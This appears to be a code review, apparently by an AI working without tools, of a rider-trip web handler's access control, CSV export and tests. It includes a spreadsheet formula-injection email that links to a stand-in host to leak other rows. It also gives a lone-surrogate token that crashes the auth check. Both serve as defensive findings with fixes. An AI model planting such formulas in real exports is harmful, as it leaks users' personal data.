VERDICT: **SHIP WITH FIXES**. The access-control logic meets the request: no token gives 401, a rider on `/staff/*` gets 403, and a rider sees only their own trips. The CSV export does no escaping, though, and one class of token crashes the handler instead of returning 401.

CONFIDENCE IN VERDICT: **medium**. I had no tools, so everything below comes from reading and tracing the code, not running it. Three things are unknown: whether `auth.py` and `trips.py` are fixtures or the production modules, where rider names and emails come from, and how the HTTP layer maps an uncaught exception.

## Pass 1: Reconstruct
The work adds one `handle()` dispatcher.
- It authenticates every request first: an unknown or missing token gets 401.
- `/trips` returns the trips whose `rider` equals the caller's name.
- Any `/staff/*` path requires the `staff` role, else 403.
- Two exact paths under `/staff/` return the full trip list as JSON or CSV. Anything else gets 404.

For this to be correct, these must hold:
- The token-to-identity map is trustworthy.
- A rider's name uniquely identifies them (unstated).
- Path matching cannot be bypassed.
- Rider data fields are safe to emit into CSV (unstated).
- Every token value reaching `auth.current` either matches or raises `AuthError`.

## COVERAGE
| Unit | Status |
|---|---|
| request.md | checked |
| context.md | checked |
| app.py | checked (all paths traced) |
| auth.py | checked |
| trips.py | checked |
| test_app.py | checked (traced, not run; no tools) |

## FINDINGS
| # | Severity | Evidence | Location | What is wrong | Failure scenario | Fix and reproduction | a/b/c/d |
|---|---|---|---|---|---|---|---|
| 1 | Medium | CONFIRMED (code behaviour); rider control of fields PROBABLE | `trips.py` `as_csv`, the f-string line | Fields go into the CSV raw: no quoting, no escaping of `,` `"` or newlines, and no neutralising of a leading `=` `+` `-` `@`. | A rider record with email `=HYPERLINK("http://x/?"&A2,"x")@ex.test` (`=` is legal in an email local-part) or a name like `Smith, Jr.`. In the first case, staff open the export in a spreadsheet and the cell runs as a formula, a known way to leak other rows' personal data. In the second, the columns shift and the export is silently corrupt. | Build the CSV with `csv.writer` (QUOTE_MINIMAL or QUOTE_ALL). Prefix a `'` to any field starting with `= + - @ \t \r`. Repro: add a row `{"rider": "a,b", "email": "=1+1", ...}` and assert that `csv.reader(as_csv())` returns 4 fields per row and that no field starts with `=`. | a Y / b Y / c Y (conditional) / d unknown |
| 2 | Low | CONFIRMED | `auth.py` `current`: `token.encode("utf-8")` | A `str` token holding a lone surrogate (e.g. `"\ud800"`, which `json.loads('"\\ud800"')` produces) raises `UnicodeEncodeError`. That is not `AuthError`, so `handle` does not catch it and the request fails instead of returning 401. This is the exact case `test_an_odd_token_is_401_not_an_error` claims to cover. | An unauthenticated client sends a token with a lone surrogate and gets an unhandled exception (500 or crash, depending on the server) instead of 401. No data is exposed. | Use `token.encode("utf-8", "surrogatepass")`, or wrap the encode and raise `AuthError` on `UnicodeError`. Repro: `get("/trips", "\ud800")["status"] == 401` currently raises. | a Y / b Y / c N / d N |
| 3 | Low | CONFIRMED | `test_app.py` | Tests miss parts of the request. Nothing tests the 401 on a `/staff` route, which the request explicitly requires; the code does handle it, because auth runs before routing. `test_staff_can_export_json` asserts only the status, not that the body contains every rider's rows. | A regression that makes `/staff/trips.json` return `[]` or `for_rider(...)` still passes all 7 tests. | Add `get("/staff/trips.csv", None)["status"] == 401`. Assert that the staff JSON contains both `rita` and `tomas` rows with emails. Mutation to confirm: change `all_rows()` to return `[]`; today the suite stays green. | a Y / b Y / c N / d N |

**Rule 5 mutations** (traced, not run; I have no scratch copy):
- Delete `require_staff` → both rider-403 tests go red.
- Swap `for_rider` for `all_rows` → the Rita test goes red (Tomás row).
- Remove the `except auth.AuthError` → the 401 tests go red.

So those tests can discriminate. Their actual runs are UNVERIFIED.

## NEEDS VALIDATION
- **Hardcoded tokens.** `auth.py` `_TOKENS` holds literal, guessable tokens (`tok-sam` is staff). If this module ships to production, anyone with repository access can export all rider personal data. Fact that settles it: is `auth.py` a fixture paired with in-memory `trips.py`, or the real auth module?
- **Name as identity.** Identity is keyed by display name (`ident[0]` matched to `t["rider"]`). Two riders with the same name would see each other's trips. Fact that settles it: are `rider` values unique, stable IDs in the real data store?
- **Rider-controlled fields.** Finding 1's likelihood depends on whether riders can set their own name and email. Fact: the signup or profile-edit path.
- **No headers.** The handler response has no headers, so the CSV cannot carry `Content-Type: text/csv`, `Content-Disposition`, or `Cache-Control: no-store` (relevant for a personal-data download). Fact: does the transport layer set these per path?
- **Error mapping.** How the server maps an uncaught exception (finding 2), and whether it logs the token value when it does.

## REFUTED
- **Path-trick bypass of 403.** Exact `==` comparisons mean `/STAFF/...`, `//staff/...`, `/staff/../staff/trips.json`, and query strings all fall to 404 or 403. None reaches personal data.
- **Timing leak in token check.** The early return reveals only which table slot matched, not token bytes. `compare_digest` is used per comparison.
- **Non-string tokens crash.** `None`, ints and bytes map to `b""`, which matches nothing and gives 401. An empty string also gives 401.
- **Staff on `/trips` errors.** It returns `[]` cleanly.

## WHAT HOLDS UP
- Auth runs before routing, so the 401 applies to every path.
- The role check is on a prefix while the export routes are exact matches, which fails closed.
- Rider scoping is enforced server-side from the token, not from request input.
- Copies are returned with `dict(t)`, so the store is not exposed to mutation.

## UNVERIFIED CLAIMS
"7 tests in test_app.py pass": not run. Confirm with `python -m unittest test_app -v`.

## QUESTIONS FOR THE AUTHOR
1. Is `auth.py` (with literal tokens) the production auth, or a stand-in?
2. Can riders set their own name or email?
3. Are rider names unique identifiers?

## DECISION-MAKER SUMMARY
Fix the CSV export to quote fields and neutralise formula prefixes, and make the token check return 401 on undecodable input, before release. Confirm the hardcoded token table and name-keyed identity are test fixtures, not production. If shipped as is, the main risk is a rider planting a spreadsheet formula that runs on a staff member's machine when they open the export.

## OWNER SUMMARY
The access rules work as asked: riders see only their own trips, and staff-only exports are blocked for everyone else. The spreadsheet export needs a small fix so a rider cannot sneak harmful content into it, and one unusual login value currently causes an error instead of a clean rejection. Before launch, someone should confirm the built-in sample logins are not what production uses.

```json
{
  "schema_version": "2.3",
  "verdict": "SHIP WITH FIXES",
  "confidence": "medium",
  "inputs_ledger": [
    {"item": "request.md", "status": "seen", "matters": true},
    {"item": "context.md", "status": "seen", "matters": true},
    {"item": "app.py", "status": "seen", "matters": true},
    {"item": "auth.py", "status": "seen", "matters": true},
    {"item": "trips.py", "status": "seen", "matters": true},
    {"item": "test_app.py", "status": "seen", "matters": true}
  ],
  "coverage": {
    "checked": [
      {"unit": "app.py", "kind": "file"},
      {"unit": "auth.py", "kind": "file"},
      {"unit": "trips.py", "kind": "file"},
      {"unit": "test_app.py", "kind": "file"},
      {"unit": "request.md", "kind": "document"},
      {"unit": "context.md", "kind": "document"}
    ],
    "not_checked": [
      {"unit": "test execution / mutation runs", "reason": "no_tools"},
      {"unit": "HTTP transport layer and real data store", "reason": "not_supplied"}
    ]
  },
  "findings": [
    {
      "id": "F1", "status": "confirmed", "severity": "Medium", "evidence_level": "CONFIRMED", "track": "B",
      "location": "trips.py as_csv f-string row builder",
      "scenario": "Rider email '=HYPERLINK(...)@ex.test' or name 'Smith, Jr.' is emitted unquoted; the formula executes in a staff spreadsheet, or the columns shift and the export is corrupt.",
      "fix": "Use csv.writer with quoting and prefix ' to fields starting with = + - @ tab CR.",
      "answers": {"a": true, "b": true, "c": true, "d": false},
      "reproduction": "Add row {'rider':'a,b','email':'=1+1','bike':'B','km':1}; assert every csv.reader row of as_csv() has 4 fields and no field starts with '='. Currently fails."
    },
    {
      "id": "F2", "status": "confirmed", "severity": "Low", "evidence_level": "CONFIRMED", "track": "B",
      "location": "auth.py current: token.encode('utf-8')",
      "scenario": "Token '\\ud800' raises UnicodeEncodeError, which is not caught as AuthError; the request errors instead of returning 401.",
      "fix": "Encode with 'surrogatepass', or catch UnicodeError and raise AuthError.",
      "answers": {"a": true, "b": true, "c": false, "d": false},
      "reproduction": "get('/trips', '\\ud800') raises instead of returning status 401."
    },
    {
      "id": "F3", "status": "confirmed", "severity": "Low", "evidence_level": "CONFIRMED", "track": "B",
      "location": "test_app.py test_staff_can_export_json; no /staff 401 test",
      "scenario": "A regression making /staff/trips.json return [] passes all tests; the required 401 on staff routes is untested.",
      "fix": "Assert the staff JSON contains all riders' rows with emails; add get('/staff/trips.csv', None) == 401.",
      "answers": {"a": true, "b": true, "c": false, "d": false},
      "reproduction": "Mutate all_rows() to return []; the suite stays green."
    },
    {
      "id": "NV1", "status": "needs_validation", "location": "auth.py _TOKENS",
      "suspicion": "Literal guessable tokens (including staff) committed in source would expose all rider personal data if used in production.",
      "unresolved_fact": "Whether auth.py is a fixture or the production auth module."
    },
    {
      "id": "NV2", "status": "needs_validation", "location": "app.py trips.for_rider(ident[0])",
      "suspicion": "Identity keyed by display name; duplicate names would share trips.",
      "unresolved_fact": "Whether rider values are unique stable IDs in the real store."
    },
    {
      "id": "NV3", "status": "needs_validation", "location": "app.py response dict (no headers)",
      "suspicion": "CSV of personal data served without Content-Type, Content-Disposition or Cache-Control: no-store.",
      "unresolved_fact": "Whether the transport layer sets these headers per path."
    }
  ],
  "refuted": [
    {"id": "R1", "candidate": "Path tricks bypass the staff check", "evidence": "Export routes use exact == matching; variants fall to 403 or 404."},
    {"id": "R2", "candidate": "Timing leak of token contents", "evidence": "compare_digest per entry; the early return reveals only the matching slot."},
    {"id": "R3", "candidate": "Non-str tokens crash", "evidence": "Non-str maps to b'' and matches nothing, giving 401."}
  ]
}
```